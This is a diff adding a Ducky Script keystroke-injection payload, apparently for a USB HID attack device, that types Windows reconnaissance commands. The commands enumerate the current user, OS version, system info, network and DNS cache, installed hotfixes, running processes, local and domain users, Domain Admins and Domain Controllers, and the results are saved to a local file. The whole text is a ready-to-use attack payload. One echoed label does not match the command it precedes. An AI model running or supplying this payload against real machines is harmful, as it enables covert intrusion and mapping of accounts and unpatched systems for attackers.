@@ -1,0 +1,59 @@
+
+
+REM | Reference: https://github.com/nixawk/pentest-wiki/tree/master/1.Information-Gathering/Windows
+
+STRING echo ##whoami >> sys
+ENTER
+STRING whoami >> sys
+ENTER
+STRING echo ##ver >> sys
+ENTER
+STRING ver >> sys
+ENTER
+STRING echo ##systeminfo >> sys
+ENTER
+STRING systeminfo >> sys
+ENTER
+STRING echo ##ipconfig /all >> sys
+ENTER
+STRING ipconfig /all >> sys
+ENTER
+STRING echo ##ipconfig /displaydns >> sys
+ENTER
+STRING ipconfig /displaydns >> sys
+ENTER
+STRING echo ##wmic os list brief >> sys
+ENTER
+STRING wmic os list brief >> sys
+ENTER
+STRING echo ##wmic computersystem list full >> sys
+ENTER
+STRING wmic computersystem list full >> sys
+ENTER
+STRING echo ##wmic qfe get hotfixid >> sys
+ENTER
+STRING wmic qfe get hotfixid >> sys
+ENTER
+STRING echo ##tasklist >> sys
+ENTER
+STRING tasklist >> sys
+ENTER
+STRING echo ##net user>> sys
+ENTER
+STRING net user >> sys
+ENTER
+STRING echo ##net use /domain >> sys
+ENTER
+STRING net user /domain >> sys
+ENTER
+STRING echo ##net group "Domain Admins" /domain >> sys
+ENTER
+STRING net group "Domain Admins" /domain >> sys
+ENTER
+STRING echo ##net group "Domain Controllers" /domain >> sys
+ENTER
+STRING net group "Domain Controllers" /domain >> sys
+ENTER
+
+
+
